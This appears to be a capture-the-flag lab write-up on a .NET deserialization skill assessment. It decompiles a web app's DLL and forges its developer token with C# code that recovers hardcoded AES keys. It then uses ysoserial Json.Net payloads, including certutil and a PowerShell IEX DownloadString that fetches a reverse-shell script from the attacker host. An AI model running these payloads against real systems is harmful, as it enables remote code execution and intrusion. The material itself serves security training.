**Advanced Deserialization Attacks - LAB Skill assestment**
We are in front of a Whitebox like type of attacks where the customer(Ceralizer) gave us the access to their code and they as to gain RCE if possible!

1)Starting by unzipping the zip archive we can find under /bin the custom dll used by the backend called Cerealizer.dll, open it via Codemerx Decompile to decompress its C# code.

2)Using the native search function we can identiy that the class "**Cerealizer.Auth**" the function "**AuthCookie**" is using a JSON serializer.
And still in same class the function "Remember Cookie" is using a XML serialization.

3)Runnig Rustcan we can identify that the website is running on port TCP/8000 so let's go there and register a new user to perform a login to the portal.
Loggin in by also checking in the Remember me function we get generated a B64 encoded cookie which can be decrypted as:
```
<SecureMembershipUser xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <Email>yovecio@test.htb</Email>
  <IsApproved>false</IsApproved>
  <LastLoginDate>0001-01-01T00:00:00-08:00</LastLoginDate>
  <LastActivityDate>0001-01-01T00:00:00-08:00</LastActivityDate>
  <Id>3</Id>
  <Username>yovecio</Username>
  <FirstName>yovecio</FirstName>
  <LastName>yovecio</LastName>
</SecureMembershipUser>
```

The remember me cookie is just gibberish code, but we can see a hidden parameter called **isApproved=false** which might indeed allows us to reach some kind of dev/admin function that allows us to perform the foothold maybe?

4)Checking the local code we can see how it looks like the cookie generator JSON + B64 encoding:

```
public static HttpCookie Generate(SecureMembershipUser User)
		{
			String SerializedUser = JsonConvert.SerializeObject(User);
			ICryptoTransform encryptor = (new AesManaged()).CreateEncryptor(AuthCookie.Key, AuthCookie.IV);
			MemoryStream ms = new MemoryStream();
			CryptoStream cs = new CryptoStream(ms, encryptor, 1);
			try
			{
				StreamWriter sw = new StreamWriter(cs);
				try
				{
					sw.Write(SerializedUser);
				}
				finally
				{
					if (sw != null)
					{
						sw.Dispose();
					}
				}
			}
			finally
			{
				if (cs != null)
				{
					cs.Dispose();
				}
			}
			HttpCookie authCookie = new HttpCookie(AuthCookie.CookieName);
			authCookie.set_Value(Convert.ToBase64String(ms.ToArray()));
			authCookie.set_HttpOnly(true);
			return authCookie;
		}


        But also the user validation:
        public static SecureMembershipUser Validate(String CookieVal)
		{
			SecureMembershipUser secureMembershipUser;
			try
			{
				ICryptoTransform decryptor = (new AesManaged()).CreateDecryptor(AuthCookie.Key, AuthCookie.IV);
				MemoryStream ms = new MemoryStream(Convert.FromBase64String(CookieVal));
				String SerializedUser = null;
				CryptoStream cs = new CryptoStream(ms, decryptor, 0);
				try
				{
					StreamReader sr = new StreamReader(cs);
					try
					{
						SerializedUser = sr.ReadToEnd();
					}
					finally
					{
						if (sr != null)
						{
							sr.Dispose();
						}
					}
				}
				finally
				{
					if (cs != null)
					{
						cs.Dispose();
					}
				}
				secureMembershipUser = JsonConvert.DeserializeObject<SecureMembershipUser>(SerializedUser);
			}
			catch
			{
				secureMembershipUser = null;
			}
			return secureMembershipUser;
		}

```

5)Now I see that a sanitation is applied on the cookie and on the deserialization(JSON) applied on the cookie so I don't think this will be relevant so far.
But then it questions if we need to do it in the so looking around seems like we have access to **/profile** which let's the current user to perform account resets like Username/email/password etc
But I also see that the application in the remember me cookie checks implicitly that the XML serializer must be same as type of SecureMembershipUser which makes it secure and apparently not usable?

Next under **Profile.Controller** we can find a third JSON deserialization:

```
[Authorize]
		[HttpPost]
		public String Load()
		{
			String body;
			if (!DevToken.Validate(base.get_Request().get_Headers().get_Item(DevToken.HeaderName)))
			{
				return "Unauthorized";
			}
			StreamReader reader = new StreamReader(base.get_Request().get_InputStream());
			try
			{
				body = reader.ReadToEnd();
			}
			finally
			{
				if (reader != null)
				{
					reader.Dispose();
				}
			}
			if (body.ToLower().Contains("system.diagnostics.process"))
			{
				return "Blacklisted keyword";
			}
			JsonSerializerSettings settings = new JsonSerializerSettings();
			settings.set_TypeNameHandling(4);
			settings.set_TypeNameAssemblyFormatHandling(1);
			JsonConvert.DeserializeObject(body, settings);
			return "OK";
		}

```

As we can see if only checks if the string contain system.diagnostics.process and if not then it proceed with deserialization, this might be our way in!
The onlyb issue is that we need to pass the **Devcookie** validation, since we can't decrypt the **devcookie** class(most likely is missing a library both in ILSpuy and CodemerxDecompiler) I will use DNSpy on Windows and hope that we can decompile better!

6) Now before doing anything we need to unpack the **devcookie** and replace all the gibberish names to make it more humanly readable then can we use the code to generate a dev token and reach the dev function for RCE. We can do it manually by replacing the values to be more humanly readable to match this one:
```
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class DevToken
{
        public static readonly string HeaderName = "SecureAuth.DevToken";

        private static AesManaged Init()
        {
                return new AesManaged();
        }

        private static ICryptoTransform CreateDecryptor(AesManaged a, byte[] b, byte[] c)
        {
                return a.CreateDecryptor(b, c);
        }

        private static void xor1(byte[] first, byte[] third, out byte[] result1, out byte[] result2)
        {
                result1 = (byte[])first.Clone();
                result2 = (byte[])third.Clone();
                for (int i = 0; i < 16; i++)
                {
                        result1[i] = (byte)(first[i] ^ 0x58u);
                        result2[i] = (byte)(third[i] ^ 0x4Du);
                }
        }

        private static void xor2(byte[] fifth, out byte[] result3)
        {
                result3 = (byte[])fifth.Clone();
                for (int i = 0; i < fifth.Length; i++)
                {
                        result3[i] ^= 55;
                }
        }

        private static MemoryStream CreateMemoryStream(byte[] MemoryStreamObj)
        {
                return new MemoryStream(MemoryStreamObj);
        }

        private static byte[] FromBase64String(string Msg)
        {
                return Convert.FromBase64String(Msg);
        }

        private static CryptoStream CreateCryptoStream(MemoryStream stream, ICryptoTransform decoder)
        {
                return new CryptoStream(stream, decoder, CryptoStreamMode.Read);
        }

        private static StreamReader CreateStreamReader(CryptoStream stream)
        {
                return new StreamReader(stream);
        }

        private static string Read(StreamReader stream)
        {
                return stream.ReadToEnd();
        }

        private static bool CompareStrings(string value1, string value2)
        {
                return string.Compare(value1, value2) == 0;
        }

        private static string EncodeUTF8(byte[] value1)
        {
                return Encoding.UTF8.GetString(value1);
        }

        private static bool IsNull(string value1)
        {
                return string.IsNullOrEmpty(value1);
        }

        private static bool CompareByteArrays(byte[] value1, byte[] value2)
        {
                return value1.Equals(value2);
        }

        public static bool Validate(string Token)
        {
                byte[] first = new byte[16]
                {
                        43, 61, 59, 45, 42, 49, 44, 33, 118, 62,
                        55, 42, 118, 54, 55, 47
                };
                byte[] second = new byte[16]
                {
                        63, 97, 12, 29, 85, 28, 1, 105, 43, 86,
                        26, 83, 19, 42, 43, 96
                };
                byte[] third = new byte[16]
                {
                        36, 35, 36, 57, 36, 44, 33, 36, 55, 40,
                        41, 99, 35, 40, 53, 57
                };
                byte[] fourth = new byte[27]
                {
                        127, 99, 56, 38, 89, 60, 109, 103, 23, 87,
                        4, 75, 82, 79, 104, 104, 37, 62, 41, 60,
                        9, 1, 22, 127, 19, 64, 5
                };
                byte[] fifth = new byte[27]
                {
                        127, 99, 117, 76, 68, 4, 84, 69, 4, 99,
                        104, 83, 4, 65, 4, 123, 7, 71, 4, 101,
                        104, 67, 7, 92, 82, 89, 74
                };
                if (IsNull(Token))
                {
                        return false;
                }
                if (CompareByteArrays(second, fourth))
                {
                        return false;
                }
                xor2(fifth, out var result3);
                xor1(first, third, out var result1, out var result2);
                try
                {
                        AesManaged AESManager = Init();
                        ICryptoTransform Decryptor = CreateDecryptor(AESManager, result1, result2);
                        MemoryStream MemoryStreamObj = CreateMemoryStream(FromBase64String(Token));
                        string Temp;
                        using (CryptoStream CryptoStreamObj = CreateCryptoStream(MemoryStreamObj, Decryptor))
                        {
                                using StreamReader StreamReaderObj = CreateStreamReader(CryptoStreamObj);
                                Temp = Read(StreamReaderObj);
                        }
                        return CompareStrings(Temp, EncodeUTF8(result3));
                }
                catch
                {
                        return false;
                }
        }
}
```

8)Next we need to calculate the token based on this code that we got from chat-gpt:

```
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class DevToken
{
	public static readonly string HeaderName = "SecureAuth.DevToken";

	private static AesManaged Init()
	{
		return new AesManaged();
	}

	private static ICryptoTransform CreateDecryptor(AesManaged a, byte[] b, byte[] c)
	{
		return a.CreateDecryptor(b, c);
	}

	private static void xor1(byte[] first, byte[] third, out byte[] result1, out byte[] result2)
	{
		result1 = (byte[])first.Clone();
		result2 = (byte[])third.Clone();
		for (int i = 0; i < 16; i++)
		{
			result1[i] = (byte)(first[i] ^ 0x58u);
			result2[i] = (byte)(third[i] ^ 0x4Du);
		}
	}

	private static void xor2(byte[] fifth, out byte[] result3)
	{
		result3 = (byte[])fifth.Clone();
		for (int i = 0; i < fifth.Length; i++)
		{
			result3[i] ^= 55;
		}
	}

	private static MemoryStream CreateMemoryStream(byte[] MemoryStreamObj)
	{
		return new MemoryStream(MemoryStreamObj);
	}

	private static byte[] FromBase64String(string Msg)
	{
		return Convert.FromBase64String(Msg);
	}

	private static CryptoStream CreateCryptoStream(MemoryStream stream, ICryptoTransform decoder)
	{
		return new CryptoStream(stream, decoder, CryptoStreamMode.Read);
	}

	private static StreamReader CreateStreamReader(CryptoStream stream)
	{
		return new StreamReader(stream);
	}

	private static string Read(StreamReader stream)
	{
		return stream.ReadToEnd();
	}

	private static bool CompareStrings(string value1, string value2)
	{
		return string.Compare(value1, value2) == 0;
	}

	private static string EncodeUTF8(byte[] value1)
	{
		return Encoding.UTF8.GetString(value1);
	}

	private static bool IsNull(string value1)
	{
		return string.IsNullOrEmpty(value1);
	}

	private static bool CompareByteArrays(byte[] value1, byte[] value2)
	{
		return value1.Equals(value2);
	}

	public static bool Validate(string Token)
	{
		byte[] first = new byte[16]
		{
			43, 61, 59, 45, 42, 49, 44, 33, 118, 62,
			55, 42, 118, 54, 55, 47
		};
		byte[] second = new byte[16]
		{
			63, 97, 12, 29, 85, 28, 1, 105, 43, 86,
			26, 83, 19, 42, 43, 96
		};
		byte[] third = new byte[16]
		{
			36, 35, 36, 57, 36, 44, 33, 36, 55, 40,
			41, 99, 35, 40, 53, 57
		};
		byte[] fourth = new byte[27]
		{
			127, 99, 56, 38, 89, 60, 109, 103, 23, 87,
			4, 75, 82, 79, 104, 104, 37, 62, 41, 60,
			9, 1, 22, 127, 19, 64, 5
		};
		byte[] fifth = new byte[27]
		{
			127, 99, 117, 76, 68, 4, 84, 69, 4, 99,
			104, 83, 4, 65, 4, 123, 7, 71, 4, 101,
			104, 67, 7, 92, 82, 89, 74
		};
		if (IsNull(Token))
		{
			return false;
		}
		if (CompareByteArrays(second, fourth))
		{
			return false;
		}
		xor2(fifth, out var result3);
		xor1(first, third, out var result1, out var result2);
		try
		{
		    Console.WriteLine(EncodeUTF8(result3));
			AesManaged AESManager = Init();
			ICryptoTransform Decryptor = CreateDecryptor(AESManager, result1, result2);
			MemoryStream MemoryStreamObj = CreateMemoryStream(FromBase64String(Token));
			string Temp;
			using (CryptoStream CryptoStreamObj = CreateCryptoStream(MemoryStreamObj, Decryptor))
			{
				using StreamReader StreamReaderObj = CreateStreamReader(CryptoStreamObj);
				Temp = Read(StreamReaderObj);
			}
			
			return CompareStrings(Temp, EncodeUTF8(result3));
		}
		catch
		{
			return false;
		}
	}
}

public class HelloWorld
{
    public static void Main(string[] args)
    {
        Console.WriteLine(DevToken.Validate("TEST"));
    }
}
```

WHich returns: **HTB{s3cr3T_d3v3L0p3R_t0ken}   --> B64 encoded: SFRCK3MzY3IzVF9kM1YwbDMwUHNlcl90MGtlbg==**

9)Now we need to sign the original token to match the aes encryption with this code:
```
// Cerealizer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Cerealizer.Auth.DevToken
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class DevToken
{
	public static readonly string HeaderName = "SecureAuth.DevToken";

	private static AesManaged Init()
	{
		return new AesManaged();
	}

	private static ICryptoTransform CreateDecryptor(AesManaged a, byte[] b, byte[] c)
	{
		return a.CreateDecryptor(b, c);
	}

	private static void xor1(byte[] first, byte[] third, out byte[] result1, out byte[] result2)
	{
		result1 = (byte[])first.Clone();
		result2 = (byte[])third.Clone();
		for (int i = 0; i < 16; i++)
		{
			result1[i] = (byte)(first[i] ^ 0x58u);
			result2[i] = (byte)(third[i] ^ 0x4Du);
		}
	}

	private static void xor2(byte[] fifth, out byte[] result3)
	{
		result3 = (byte[])fifth.Clone();
		for (int i = 0; i < fifth.Length; i++)
		{
			result3[i] ^= 55;
		}
	}

	private static MemoryStream CreateMemoryStream(byte[] MemoryStreamObj)
	{
		return new MemoryStream(MemoryStreamObj);
	}

	private static byte[] FromBase64String(string Msg)
	{
		return Convert.FromBase64String(Msg);
	}

	private static CryptoStream CreateCryptoStream(MemoryStream stream, ICryptoTransform decoder)
	{
		return new CryptoStream(stream, decoder, CryptoStreamMode.Read);
	}

	private static StreamReader CreateStreamReader(CryptoStream stream)
	{
		return new StreamReader(stream);
	}

	private static string Read(StreamReader stream)
	{
		return stream.ReadToEnd();
	}

	private static bool CompareStrings(string value1, string value2)
	{
		return string.Compare(value1, value2) == 0;
	}

	private static string EncodeUTF8(byte[] value1)
	{
		return Encoding.UTF8.GetString(value1);
	}

	private static bool IsNull(string value1)
	{
		return string.IsNullOrEmpty(value1);
	}

	private static bool CompareByteArrays(byte[] value1, byte[] value2)
	{
		return value1.Equals(value2);
	}

	public static bool Validate(string Token)
	{
		byte[] first = new byte[16]
		{
			43, 61, 59, 45, 42, 49, 44, 33, 118, 62,
			55, 42, 118, 54, 55, 47
		};
		byte[] second = new byte[16]
		{
			63, 97, 12, 29, 85, 28, 1, 105, 43, 86,
			26, 83, 19, 42, 43, 96
		};
		byte[] third = new byte[16]
		{
			36, 35, 36, 57, 36, 44, 33, 36, 55, 40,
			41, 99, 35, 40, 53, 57
		};
		byte[] fourth = new byte[27]
		{
			127, 99, 56, 38, 89, 60, 109, 103, 23, 87,
			4, 75, 82, 79, 104, 104, 37, 62, 41, 60,
			9, 1, 22, 127, 19, 64, 5
		};
		byte[] fifth = new byte[27]
		{
			127, 99, 117, 76, 68, 4, 84, 69, 4, 99,
			104, 83, 4, 65, 4, 123, 7, 71, 4, 101,
			104, 67, 7, 92, 82, 89, 74
		};
		if (IsNull(Token))
		{
			return false;
		}
		if (CompareByteArrays(second, fourth))
		{
			return false;
		}
		xor2(fifth, out var result3);
		xor1(first, third, out var result1, out var result2);
		try
		{
			AesManaged AESManager = Init();
			ICryptoTransform Decryptor = CreateDecryptor(AESManager, result1, result2);
			MemoryStream MemoryStreamObj = CreateMemoryStream(FromBase64String(Token));
			string Temp;
			using (CryptoStream CryptoStreamObj = CreateCryptoStream(MemoryStreamObj, Decryptor))
			{
				using StreamReader StreamReaderObj = CreateStreamReader(CryptoStreamObj);
				Temp = Read(StreamReaderObj);
			}
			return CompareStrings(Temp, EncodeUTF8(result3));
		}
		catch
		{
			return false;
		}
	}
    private static ICryptoTransform CreateEncryptor(AesManaged aes, byte[] key, byte[] iv)
    {
        return aes.CreateEncryptor(key, iv);
    }
    public static string EncryptToken(string token)
    {
        // Reverse engineer the XOR operations on byte arrays
        byte[] first = new byte[16]
        {
            43, 61, 59, 45, 42, 49, 44, 33, 118, 62,
            55, 42, 118, 54, 55, 47
        };
        byte[] third = new byte[16]
        {
            36, 35, 36, 57, 36, 44, 33, 36, 55, 40,
            41, 99, 35, 40, 53, 57
        };
        byte[] fifth = new byte[27]
        {
            127, 99, 117, 76, 68, 4, 84, 69, 4, 99,
            104, 83, 4, 65, 4, 123, 7, 71, 4, 101,
            104, 67, 7, 92, 82, 89, 74
        };

        // XOR operations
        xor1(first, third, out byte[] result1, out byte[] result2);
        xor2(fifth, out byte[] result3);

        // Initialize AES encryption
        AesManaged aes = Init();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;

        // Create encryptor with XOR-ed keys
        ICryptoTransform encryptor = CreateEncryptor(aes, result1, result2);

        // Encrypt the token
        byte[] encryptedBytes;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
            {
                byte[] plainBytes = Encoding.UTF8.GetBytes(token);
                cryptoStream.Write(plainBytes, 0, plainBytes.Length);
            }
            encryptedBytes = memoryStream.ToArray();
        }

        // Convert encrypted bytes to Base64 string
        return Convert.ToBase64String(encryptedBytes);
    }
}

public class HelloWorld
{
    public static void Main(string[] args)
    {
        
        string token = "HTB{s3cr3T_d3v3L0p3R_t0ken}";
        string encryptedToken = DevToken.EncryptToken(token);
        Console.WriteLine(DevToken.Validate(encryptedToken));
        Console.WriteLine(encryptedToken);
    }
}

```
This will generate the signed token in B64 encoding:
**B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0=**

10)Lastly we can use the token 
```
SecureAuth.DevToken: B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0=
URL: /Profile/Post
Method: POST (not GET)
```

Together with the payload as: `.\ysoserial.exe -f Json.Net -g SessionSecurityToken -c "certutil.exe -urlcache -f http://10.10.14.100:8000/test" -o raw`
(Remember to add the Content-Type: application/Json as well)

11)This get us a rce back to our machine!
```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
            
10.129.228.225 - - [12/Apr/2024 21:16:24] code 404, message File not found
10.129.228.225 - - [12/Apr/2024 21:16:24] "GET /test HTTP/1.1" 404 -
10.129.228.225 - - [12/Apr/2024 21:16:24] code 404, message File not found
10.129.228.225 - - [12/Apr/2024 21:16:24] "GET /test HTTP/1.1" 404 -

Now we need to adapt the command to get us a revshell via a hosted powershell script with a Powershell base64 encoded hosted on our machine.
.\ysoserial.exe -f Json.Net -g SessionSecurityToken -c "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.100:8000/shell.ps1')" -o raw
```
